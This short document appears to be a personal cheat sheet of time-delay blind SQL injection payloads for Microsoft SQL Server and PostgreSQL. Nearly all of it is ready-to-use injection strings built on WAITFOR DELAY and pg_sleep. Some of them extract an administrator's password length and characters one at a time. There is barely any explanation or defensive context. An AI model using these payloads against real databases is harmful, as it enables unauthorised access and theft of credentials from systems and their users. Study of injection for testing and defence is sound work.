# Time delay blind SQLi
Microsoft SQL

`'; IF (1=2) WAITFOR DELAY '0:0:10'--`

`'; IF (1=1) WAITFOR DELAY '0:0:10'--`

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

### example:
PostgreSQL

`'%3bSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

`'%3bSELECT CASE WHEN ((SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--`		to find lenght

`'%3bSELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 20, 1) = 'l') THEN pg_sleep(5) ELSE pg_sleep(0) END--`		to find a char from password
